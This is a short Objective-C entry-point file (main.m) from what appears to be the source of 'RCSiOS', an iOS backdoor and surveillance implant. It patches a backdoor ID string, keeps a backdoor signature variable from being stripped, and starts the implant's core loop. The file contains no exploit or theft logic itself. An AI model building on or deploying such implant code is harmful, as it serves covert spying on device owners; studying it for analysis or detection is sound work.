/*
 * RCSiOS version 2.1
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#import "RCSICore.h"
#import "RCSIConfManager.h"
#import "RCSICommon.h"
#import "RCSITaskManager.h"
#import "RCSILogger.h"
#import "RCSIDebug.h"
#import "RCSIGlobals.h"

int main (int argc, const char * argv[])
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // FIXED- fixing string binary patched
  gBackdoorID[14] = gBackdoorID[15] = 0;
  
  // fix for compile time strip...
  char *tmpWmaker = gBackdoorPseduoSign; 
  tmpWmaker += 1;
  
  _i_Core *core = [[_i_Core alloc] init];

  [core runMeh];
  
  [core release];
  [pool release];

  return 0;
}
